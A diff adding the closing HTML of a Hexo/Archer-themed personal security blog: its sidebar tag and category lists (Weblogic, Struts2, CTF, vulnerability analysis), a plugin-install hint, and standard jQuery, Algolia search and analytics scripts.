+        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
+    
+        <span class="sidebar-tag-name" data-tags="Nexuss"><span class="iconfont-archer">&#xe606;</span>Nexuss</span>
+    
+        <span class="sidebar-tag-name" data-tags="Weblogic"><span class="iconfont-archer">&#xe606;</span>Weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tomcat"><span class="iconfont-archer">&#xe606;</span>Tomcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="回显方案"><span class="iconfont-archer">&#xe606;</span>回显方案</span>
+    
+        <span class="sidebar-tag-name" data-tags="Struts2"><span class="iconfont-archer">&#xe606;</span>Struts2</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="blockchain"><span class="iconfont-archer">&#xe606;</span>blockchain</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="薅羊毛"><span class="iconfont-archer">&#xe606;</span>薅羊毛</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+    
+        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
+    
+        <span class="sidebar-category-name" data-categories="环境部署"><span class="iconfont-archer">&#xe60a;</span>环境部署</span>
+    
+        <span class="sidebar-category-name" data-categories="技术总结"><span class="iconfont-archer">&#xe60a;</span>技术总结</span>
+    
+        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
+    
+        <span class="sidebar-category-name" data-categories="一些思路"><span class="iconfont-archer">&#xe60a;</span>一些思路</span>
+    
+        <span class="sidebar-category-name" data-categories="blockchain"><span class="iconfont-archer">&#xe60a;</span>blockchain</span>
+    
+        <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Lucifaer"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
